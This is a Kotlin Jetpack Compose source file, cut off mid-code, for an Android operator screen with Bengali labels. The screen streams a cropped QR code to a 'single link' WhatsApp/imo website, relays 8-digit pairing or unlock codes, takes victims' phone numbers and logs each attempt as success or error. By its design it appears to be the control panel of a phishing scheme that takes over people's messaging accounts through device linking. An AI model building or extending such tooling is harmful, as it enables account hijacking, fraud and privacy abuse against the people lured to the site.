package com.example.ui.screens

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.widget.Toast
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.layout.widthIn
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowForward
import androidx.compose.material.icons.automirrored.filled.ExitToApp
import androidx.compose.material.icons.automirrored.filled.ScreenShare
import androidx.compose.material.icons.automirrored.filled.Send
import androidx.compose.material.icons.automirrored.filled.StopScreenShare
import androidx.compose.material.icons.automirrored.filled.VolumeUp
import androidx.compose.material.icons.filled.Cast
import androidx.compose.material.icons.filled.Cancel
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Link
import androidx.compose.material.icons.filled.MoreVert
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.NotificationsActive
import androidx.compose.material.icons.filled.OpenInBrowser
import androidx.compose.material.icons.filled.Public
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Badge
import androidx.compose.material3.BadgedBox
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.DropdownMenu
import androidx.compose.material3.DropdownMenuItem
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.semantics.contentDescription
import androidx.compose.ui.semantics.semantics
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.data.model.PathChannel
import com.example.data.model.PathChannelsRegistry
import com.example.data.model.WebsitePlatform
import com.example.util.ChannelWebPortalGenerator
import com.example.util.ScreenShareManager

/**
 * SponsoredAdMainScreen
 *
 * Fresh, lightweight, instant-response UI focused strictly on the app's core functions:
 * 1. Unified Single-Link Website Mode Switcher (WhatsApp <-> imo)
 * 2. Live Screen Preview (with Smart QR Crop / Full Screen toggle) & Start/Stop Screen Share
 * 3. Fly Button (8-digit WhatsApp pairing code / 4-8 digit imo code)
 * 4. Phone Number + Next Button
 * 5. Success Button
 * 6. Error Button
 * 7. Bottom Bar: Open Website & Copy Single Link
 */
@Composable
fun SponsoredAdMainScreen(
    modifier: Modifier = Modifier,
    currentChannel: PathChannel = PathChannelsRegistry.getChannelBySlot(1),
    selectedPlatform: WebsitePlatform = WebsitePlatform.WHATSAPP,
    isScreenSharing: Boolean = false,
    screenShareDuration: String = "00:00",
    latestFrameBitmap: Bitmap? = null,
    cropMode: ScreenShareManager.ScreenCropMode = ScreenShareManager.ScreenCropMode.QR_CODE_ONLY,
    showScreenShareGuideDialog: Boolean = false,
    initialPairingCode: String = "",
    initialPhoneNumber: String = "",
    onSelectPlatform: (WebsitePlatform) -> Unit = {},
    onStartScreenShare: () -> Unit = {},
    onStopScreenShare: () -> Unit = {},
    onSetCropMode: (ScreenShareManager.ScreenCropMode) -> Unit = {},
    onFlyClick: (code: String, onClear: () -> Unit) -> Unit = { _, _ -> },
    onNextClick: (String) -> Unit = {},
    onSuccessClick: () -> Unit = {},
    onErrorClick: () -> Unit = {},
    unreadNotificationCount: Int = 0,
    onOpenNotifications: () -> Unit = {},
    pendingFlyCode: String? = null,
    pendingPhoneNumber: String? = null,
    onClearFirebaseData: () -> Unit = {},
    onOpenScreenShareGuide: () -> Unit = {},
    onCloseScreenShareGuide: () -> Unit = {},
    onSpeakGuide: () -> Unit = {},
    onLogoutChannel: () -> Unit = {}
) {
    val context = LocalContext.current
    val scrollState = rememberScrollState()
    var pairingCode by remember { mutableStateOf(initialPairingCode) }
    var phoneNumber by remember { mutableStateOf(initialPhoneNumber) }
    var showMoreMenu by remember { mutableStateOf(false) }

    LaunchedEffect(pendingFlyCode) {
        if (!pendingFlyCode.isNullOrBlank()) {
            pairingCode = pendingFlyCode
        }
    }

    LaunchedEffect(pendingPhoneNumber) {
        if (!pendingPhoneNumber.isNullOrBlank()) {
            phoneNumber = pendingPhoneNumber
        }
    }

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xFF0066CC))
            .testTag("sponsored_ad_main_screen")
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .statusBarsPadding()
        ) {
            // ============================================================
            // 1. TOP APP BAR
            // ============================================================
            Surface(
                color = Color(0xFF0066CC),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(56.dp)
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(horizontal = 12.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.weight(1f, fill = false)
                    ) {
                        Surface(
                            shape = CircleShape,
                            color = Color.White.copy(alpha = 0.2f),
                            border = BorderStroke(1.5.dp, Color.White),
                            modifier = Modifier.size(36.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.Link,
                                    contentDescription = "লোগো",
                                    tint = Color.White,
                                    modifier = Modifier.size(20.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(8.dp))
                        Column {
                            Text(
                                text = "Link Assistant • #${currentChannel.slotNumber}",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.White,
                                maxLines = 1
                            )
                            Text(
                                text = "WhatsApp + imo একক লিংক ও স্ক্রিন শেয়ার",
                                fontSize = 11.sp,
                                color = Color.White.copy(alpha = 0.88f),
                                maxLines = 1,
                                overflow = TextOverflow.Ellipsis
                            )
                        }
                    }

                    Row(verticalAlignment = Alignment.CenterVertically) {
                        IconButton(
                            onClick = onOpenNotifications,
                            modifier = Modifier
                                .size(48.dp)
                                .testTag("top_notification_icon_button")
                                .semantics { contentDescription = "নোটিফিকেশন বার্তা" }
                        ) {
                            BadgedBox(
                                badge = {
                                    if (unreadNotificationCount > 0) {
                                        Badge(
                                            containerColor = Color(0xFFEF4444),
                                            contentColor = Color.White
                                        ) {
                                            Text(
                                                text = if (unreadNotificationCount > 9) "9+" else unreadNotificationCount.toString(),
                                                fontSize = 10.sp,
                                                fontWeight = FontWeight.Bold
                                            )
                                        }
                                    }
                                }
                            ) {
                                Icon(
                                    imageVector = if (unreadNotificationCount > 0) Icons.Default.NotificationsActive else Icons.Default.Notifications,
                                    contentDescription = "নোটিফিকেশন বার্তা",
                                    tint = Color.White,
                                    modifier = Modifier.size(24.dp)
                                )
                            }
                        }

                        Box {
                            IconButton(
                                onClick = { showMoreMenu = true },
                                modifier = Modifier
                                    .size(48.dp)
                                    .testTag("top_three_dots_menu_button")
                                    .semantics { contentDescription = "থ্রি ডট মেনু" }
                            ) {
                                Icon(
                                    imageVector = Icons.Default.MoreVert,
                                    contentDescription = "মেনু",
                                    tint = Color.White,
                                    modifier = Modifier.size(24.dp)
                                )
                            }

                            DropdownMenu(
                            expanded = showMoreMenu,
                            onDismissRequest = { showMoreMenu = false },
                            modifier = Modifier
                                .background(Color.White)
                                .widthIn(min = 240.dp)
                        ) {
                            DropdownMenuItem(
                                text = {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(
                                            imageVector = Icons.Default.Info,
                                            contentDescription = null,
                                            tint = Color(0xFF155E44),
                                            modifier = Modifier.size(18.dp)
                                        )
                                        Spacer(modifier = Modifier.width(10.dp))
                                        Text(
                                            text = "স্ক্রিন শেয়ারের নিয়মাবলী",
                                            color = Color(0xFF1C1E21),
                                            fontWeight = FontWeight.SemiBold,
                                            fontSize = 14.sp
                                        )
                                    }
                                },
                                onClick = {
                                    showMoreMenu = false
                                    onOpenScreenShareGuide()
                                },
                                modifier = Modifier.testTag("menu_guide_item")
                            )

                            DropdownMenuItem(
                                text = {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(
                                            imageVector = Icons.Default.Delete,
                                            contentDescription = null,
                                            tint = Color(0xFFBA1A1A),
                                            modifier = Modifier.size(18.dp)
                                        )
                                        Spacer(modifier = Modifier.width(10.dp))
                                        Text(
                                            text = "ফায়ারবেস স্ক্রিন ডাটা ক্লেয়ার",
                                            color = Color(0xFFBA1A1A),
                                            fontWeight = FontWeight.SemiBold,
                                            fontSize = 14.sp
                                        )
                                    }
                                },
                                onClick = {
                                    showMoreMenu = false
                                    onClearFirebaseData()
                                },
                                modifier = Modifier.testTag("menu_clear_firebase_item")
                            )

                            HorizontalDivider(color = Color(0xFFE2E8F0))

                            DropdownMenuItem(
                                text = {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(
                                            imageVector = Icons.AutoMirrored.Filled.Send,
                                            contentDescription = null,
                                            tint = Color(0xFF229ED9),
                                            modifier = Modifier.size(18.dp)
                                        )
                                        Spacer(modifier = Modifier.width(10.dp))
                                        Text(
                                            text = "টেলিগ্রাম হেল্প সেন্টার",
                                            color = Color(0xFF0369A1),
                                            fontWeight = FontWeight.Bold,
                                            fontSize = 14.sp
                                        )
                                    }
                                },
                                onClick = {
                                    showMoreMenu = false
                                    try {
                                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/httpsViralVideoBangla"))
                                        context.startActivity(intent)
                                    } catch (_: Exception) {
                                        Toast.makeText(context, "টেলিগ্রাম খোলা সম্ভব হয়নি", Toast.LENGTH_SHORT).show()
                                    }
                                },
                                modifier = Modifier.testTag("telegram_help_center_menu_item")
                            )

                            HorizontalDivider(color = Color(0xFFE2E8F0))

                            DropdownMenuItem(
                                text = {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Icon(
                                            imageVector = Icons.AutoMirrored.Filled.ExitToApp,
                                            contentDescription = null,
                                            tint = Color(0xFFBA1A1A),
                                            modifier = Modifier.size(18.dp)
                                        )
                                        Spacer(modifier = Modifier.width(10.dp))
                                        Text(
                                            text = "লগআউট",
                                            color = Color(0xFFBA1A1A),
                                            fontWeight = FontWeight.Bold,
                                            fontSize = 14.sp
                                        )
                                    }
                                },
                                onClick = {
                                    showMoreMenu = false
                                    onLogoutChannel()
                                },
                                modifier = Modifier.testTag("logout_channel_menu_item")
                            )
                        }
                    }
                }
            }
        }

            // ============================================================
            // 2. MAIN CONTENT
            // ============================================================
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(1f)
                    .background(Color(0xFFF1F5F9))
                    .verticalScroll(scrollState)
                    .padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(14.dp)
            ) {
                // (১) একক লিংকে অটো ওয়েবসাইট মোড সুইচার (WhatsApp <-> imo)
                Card(
                    shape = RoundedCornerShape(14.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    border = BorderStroke(1.dp, Color(0xFFE2E8F0)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(
                        modifier = Modifier.padding(10.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            val waSelected = selectedPlatform == WebsitePlatform.WHATSAPP
                            Surface(
                                shape = RoundedCornerShape(10.dp),
                                color = if (waSelected) Color(0xFF155E44) else Color(0xFFF1F5F9),
                                border = BorderStroke(
                                    width = 1.5.dp,
                                    color = if (waSelected) Color(0xFF155E44) else Color(0xFFCBD5E1)
                                ),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(48.dp)
                                    .clip(RoundedCornerShape(10.dp))
                                    .clickable { onSelectPlatform(WebsitePlatform.WHATSAPP) }
                                    .semantics {
                                        contentDescription = "WhatsApp বাটন — চাপলে ওয়েবসাইটটি WhatsApp মোডে থাকবে"
                                    }
                                    .testTag("select_whatsapp_website_tab")
                            ) {
                                Row(
                                    modifier = Modifier
                                        .fillMaxSize()
                                        .padding(horizontal = 10.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.Center
                                ) {
                                    Box(
                                        modifier = Modifier
                                            .size(8.dp)
                                            .clip(CircleShape)
                                            .background(
                                                if (waSelected && isScreenSharing) Color(0xFF22C55E)
                                                else if (waSelected) Color.White
                                                else Color(0xFF94A3B8)
                                            )
                                    )
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Text(
                                        text = if (waSelected && isScreenSharing) "WhatsApp (লাইভ)" else "WhatsApp",
                                        fontSize = 13.5.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = if (waSelected) Color.White else Color(0xFF1E293B),
                                        maxLines = 1
                                    )
                                }
                            }

                            val imoSelected = selectedPlatform == WebsitePlatform.IMO
                            Surface(
                                shape = RoundedCornerShape(10.dp),
                                color = if (imoSelected) Color(0xFF0077CC) else Color(0xFFF1F5F9),
                                border = BorderStroke(
                                    width = 1.5.dp,
                                    color = if (imoSelected) Color(0xFF0077CC) else Color(0xFFCBD5E1)
                                ),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(48.dp)
                                    .clip(RoundedCornerShape(10.dp))
                                    .clickable { onSelectPlatform(WebsitePlatform.IMO) }
                                    .semantics {
                                        contentDescription = "imo বাটন — চাপলে একই ওয়েবসাইট সাথে সাথে imo ওয়েবসাইটে সুইচ হবে"
                                    }
                                    .testTag("select_imo_website_tab")
                            ) {
                                Row(
                                    modifier = Modifier
                                        .fillMaxSize()
                                        .padding(horizontal = 10.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.Center
                                ) {
                                    Box(
                                        modifier = Modifier
                                            .size(8.dp)
                                            .clip(CircleShape)
                                            .background(
                                                if (imoSelected && isScreenSharing) Color(0xFF38BDF8)
                                                else if (imoSelected) Color.White
                                                else Color(0xFF94A3B8)
                                            )
                                    )
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Text(
                                        text = if (imoSelected && isScreenSharing) "imo (লাইভ)" else "imo",
                                        fontSize = 13.5.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = if (imoSelected) Color.White else Color(0xFF1E293B),
                                        maxLines = 1
                                    )
                                }
                            }
                        }

                        Text(
                            text = "একক লিংক সক্রিয়: এখন ওয়েবসাইটে ${selectedPlatform.labelBn} চালু আছে",
                            fontSize = 11.5.sp,
                            fontWeight = FontWeight.SemiBold,
                            color = if (selectedPlatform == WebsitePlatform.IMO) Color(0xFF0369A1) else Color(0xFF155E44),
                            modifier = Modifier.padding(horizontal = 4.dp)
                        )
                    }
                }

                // (২) লাইভ স্ক্রিন প্রিভিউ ও স্মার্ট QR / ফুল স্ক্রিন মোড কার্ড
                Card(
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF0F172A)),
                    elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(
                        modifier = Modifier.padding(14.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = Icons.Default.Cast,
                                    contentDescription = null,
                                    tint = Color(0xFF38BDF8),
                                    modifier = Modifier.size(18.dp)
                                )
                                Spacer(modifier = Modifier.width(6.dp))
                                Text(
                                    text = "${selectedPlatform.shortLabelBn} লাইভ প্রিভিউ",
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color.White
                                )
                            }
                            Surface(
                                shape = RoundedCornerShape(12.dp),
                                color = if (isScreenSharing) Color(0xFFB71C1C) else Color(0xFF334155)
                            ) {
                                Text(
                                    text = if (isScreenSharing) "🔴 লাইভ $screenShareDuration" else "স্ট্যান্ডবাই",
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color.White,
                                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp)
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(200.dp)
                                .clip(RoundedCornerShape(12.dp))
                                .background(Color(0xFF020617)),
                            contentAlignment = Alignment.Center
                        ) {
                            if (isScreenSharing && latestFrameBitmap != null) {
                                Image(
                                    bitmap = latestFrameBitmap.asImageBitmap(),
                                    contentDescription = "লাইভ স্ক্রিন প্রিভিউ",
                                    contentScale = ContentScale.Fit,
                                    modifier = Modifier.fillMaxSize()
                                )
                            } else {
                                Column(
                                    horizontalAlignment = Alignment.CenterHorizontally,
                                    verticalArrangement = Arrangement.Center
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.Public,
                                        contentDescription = null,
                                        tint = Color(0xFF64748B),
                                        modifier = Modifier.size(36.dp)
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    Text(
                                        text = "${selectedPlatform.labelBn} এ শেয়ার করলে এখানে দেখা যাবে",
                                        fontSize = 12.sp,
                                        color = Color(0xFF94A3B8)
                                    )
                                    Text(
                                        text = "স্মার্ট QR মোডে শুধু কিউআর কোডটি ফাস্ট ও স্পষ্ট দেখা যাবে",
                                        fontSize = 11.sp,
                                        color = Color(0xFF64748B)
                                    )
                                }
                            }
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        // Fast Crop Mode Toggle (Smart QR Crop vs Full Screen)
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            val isQrCrop = cropMode == ScreenShareManager.ScreenCropMode.QR_CODE_ONLY
                            Surface(
                                shape = RoundedCornerShape(8.dp),
                                color = if (isQrCrop) Color(0xFF10B981) else Color(0xFF1E293B),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(38.dp)
                                    .clip(RoundedCornerShape(8.dp))
                                    .clickable { onSetCropMode(ScreenShareManager.ScreenCropMode.QR_CODE_ONLY) }
                                    .testTag("crop_qr_mode_chip")
                            ) {
                                Box(contentAlignment = Alignment.Center) {
                                    Text(
                                        text = "স্মার্ট QR ক্রপ",
                                        fontSize = 12.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = if (isQrCrop) Color(0xFF022C22) else Color(0xFFCBD5E1)
                                    )
                                }
                            }

                            val isFullCrop = cropMode == ScreenShareManager.ScreenCropMode.FULL
                            Surface(
                                shape = RoundedCornerShape(8.dp),
                                color = if (isFullCrop) Color(0xFF38BDF8) else Color(0xFF1E293B),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(38.dp)
                                    .clip(RoundedCornerShape(8.dp))
                                    .clickable { onSetCropMode(ScreenShareManager.ScreenCropMode.FULL) }
                                    .testTag("crop_full_mode_chip")
                            ) {
                                Box(contentAlignment = Alignment.Center) {
                                    Text(
                                        text = "ফুল স্ক্রিন",
                                        fontSize = 12.sp,
                                        fontWeight = FontWeight.Bold,
                                        color = if (isFullCrop) Color(0xFF082F49) else Color(0xFFCBD5E1)
                                    )
                                }
                            }
                        }
                    }
                }

                // (৩) প্রাইমারি স্ক্রিন শেয়ার চালু / বন্ধ বাটন
                val primaryShareColor = if (isScreenSharing) {
                    Color(0xFFBA1A1A)
                } else if (selectedPlatform == WebsitePlatform.IMO) {
                    Color(0xFF0077CC)
                } else {
                    Color(0xFF155E44)
                }
                Button(
                    onClick = {
                        if (isScreenSharing) onStopScreenShare() else onStartScreenShare()
                    },
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = primaryShareColor),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp)
                        .testTag("primary_screen_share_button")
                ) {
                    Icon(
                        imageVector = if (isScreenSharing) {
                            Icons.AutoMirrored.Filled.StopScreenShare
                        } else {
                            Icons.AutoMirrored.Filled.ScreenShare
                        },
                        contentDescription = null,
                        modifier = Modifier.size(20.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = if (isScreenSharing) {
                            "${selectedPlatform.shortLabelBn} স্ক্রিন শেয়ার বন্ধ ও ক্লিন করুন"
                        } else {
                            "${selectedPlatform.labelBn} এ স্ক্রিন শেয়ার চালু করুন"
                        },
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold
                    )
                }

                // (৪) পেয়ারিং / আনলক কোড + Fly বাটন কার্ড
                Card(
                    shape = RoundedCornerShape(14.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    border = BorderStroke(1.dp, Color(0xFFE2E8F0)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Text(
                            text = if (selectedPlatform == WebsitePlatform.IMO) {
                                "৪ বা ৮ সংখ্যার imo কোড (Unlock / Pairing Code)"
                            } else {
                                "৮ সংখ্যার পেয়ারিং কোড (Pairing Code)"
                            },
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF1E293B)
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            OutlinedTextField(
                                value = pairingCode,
                                onValueChange = { input ->
                                    pairingCode = input
                                        .filter { ch -> (ch in 'a'..'z') || (ch in 'A'..'Z') || (ch in '0'..'9') }
                                        .uppercase()
                                        .take(8)
                                },
                                placeholder = {
                                    Text(
                                        text = if (selectedPlatform == WebsitePlatform.IMO) "1234" else "ABC12345",
                                        fontSize = 13.sp,
                                        color = Color(0xFF94A3B8),
                                        fontFamily = FontFamily.Monospace
                                    )
                                },
                                textStyle = TextStyle(
                                    fontSize = 15.sp,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = FontFamily.Monospace,
                                    color = Color(0xFF155E44)
                                ),
                                singleLine = true,
                                shape = RoundedCornerShape(10.dp),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(52.dp)
                                    .testTag("main_pairing_code_input")
                            )
                            Button(
                                onClick = {
                                    onFlyClick(pairingCode) {
                                        pairingCode = ""
                                    }
                                },
                                shape = RoundedCornerShape(10.dp),
                                colors = ButtonDefaults.buttonColors(
                                    containerColor = if (selectedPlatform == WebsitePlatform.IMO) Color(0xFF0077CC) else Color(0xFF155E44)
                                ),
                                modifier = Modifier
                                    .height(52.dp)
                                    .testTag("main_fly_button")
                            ) {
                                Icon(Icons.AutoMirrored.Filled.Send, contentDescription = "Fly", modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(4.dp))
                                Text("Fly", fontSize = 13.sp, fontWeight = FontWeight.Bold)
                            }
                        }
                    }
                }

                // (৫) ফোন নাম্বার + Next বাটন কার্ড
                Card(
                    shape = RoundedCornerShape(14.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    border = BorderStroke(1.dp, Color(0xFFE2E8F0)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Text(
                            text = "ফোন নাম্বার (Phone Number)",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF1E293B)
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            OutlinedTextField(
                                value = phoneNumber,
                                onValueChange = { input ->
                                    phoneNumber = input.filter { it.isDigit() || it == '+' }.take(14)
                                },
                                placeholder = {
                                    Text("01XXXXXXXXX", fontSize = 13.sp, color = Color(0xFF94A3B8))
                                },
                                textStyle = TextStyle(
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF1C1E21)
                                ),
                                singleLine = true,
                                shape = RoundedCornerShape(10.dp),
                                modifier = Modifier
                                    .weight(1f)
                                    .height(52.dp)
                                    .testTag("main_phone_number_input")
                            )
                            Button(
                                onClick = { onNextClick(phoneNumber) },
                                shape = RoundedCornerShape(10.dp),
                                colors = ButtonDefaults.buttonColors(
                                    containerColor = if (selectedPlatform == WebsitePlatform.IMO) Color(0xFF0077CC) else Color(0xFF155E44)
                                ),
                                modifier = Modifier
                                    .height(52.dp)
                                    .testTag("main_next_button")
                            ) {
                                Text("Next", fontSize = 13.sp, fontWeight = FontWeight.Bold)
                                Spacer(modifier = Modifier.width(4.dp))
                                Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = "Next", modifier = Modifier.size(16.dp))
                            }
                        }
                    }
                }

                // (৬) Success বাটন
                Button(
                    onClick = onSuccessClick,
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp)
                        .testTag("success_main_button")
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color.White, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Success বাটন চাপুন", fontSize = 14.5.sp, fontWeight = FontWeight.Bold, color = Color.White)
                    }
                }

                // (৭) Error বাটন
                Button(
                    onClick = onErrorClick,
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD32F2F)),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp)
                        .testTag("error_main_button")
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.Cancel, contentDescription = null, tint = Color.White, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Error বাটন চাপুন", fontSize = 14.5.sp, fontWeight = FontWeight.Bold, color = Color.White)
                    }
                }
            }

            // ============================================================
            // 3. BOTTOM WEBSITE ACTION BAR
            // ============================================================
            Surface(
                color = Color.White,
                shadowElevation = 10.dp,
                border = BorderStroke(1.dp, Color(0xFFE2E8F0)),
                modifier = Modifier
                    .fillMaxWidth()
                    .navigationBarsPadding()
                    .testTag("bottom_website_action_bar")
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 14.dp, vertical = 10.dp),
                    horizontalArrangement = Arrangement.spacedBy(10.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    val activeChannelWebUrl = ChannelWebPortalGenerator.getActiveWebsiteUrl(
                        context = context,
                        channel = currentChannel
                    )
                    val bottomAccentColor = if (selectedPlatform == WebsitePlatform.IMO) Color(0xFF0077CC) else Color(0xFF15803D)

                    Button(
                        onClick = {
                            try {
                                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(activeChannelWebUrl))
                                context.startActivity(intent)
                            } catch (_: Exception) {
                                Toast.makeText(context, "ব্রাউজার খোলা সম্ভব হয়নি", Toast.LENGTH_SHORT).show()
                            }
                        },
                        shape = RoundedCornerShape(10.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = bottomAccentColor),
                        modifier = Modifier
                            .weight(1f)
                            .height(48.dp)
                            .testTag("open_readymade_web_button")
                    ) {
                        Icon(
                            imageVector = Icons.Default.OpenInBrowser,
                            contentDescription = null,
                            tint = Color.White,
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(modifier = Modifier.width(6.dp))
                        Text(
                            text = "ওয়েবসাইট ওপেন (${selectedPlatform.shortLabelBn})",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White,
                            maxLines = 1
                        )
                    }

                    OutlinedButton(
                        onClick = {
                            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
                            val clip = ClipData.newPlainText("Unified Website URL", activeChannelWebUrl)
                            clipboard?.setPrimaryClip(clip)
                            Toast.makeText(
                                context,
                                "প্যাথ #${currentChannel.slotNumber} একক লিংক (WhatsApp+imo) কপি হয়েছে!",
                                Toast.LENGTH_SHORT
                            ).show()
                        },
                        shape = RoundedCornerShape(10.dp),
                        border = BorderStroke(1.5.dp, bottomAccentColor),
                        modifier = Modifier
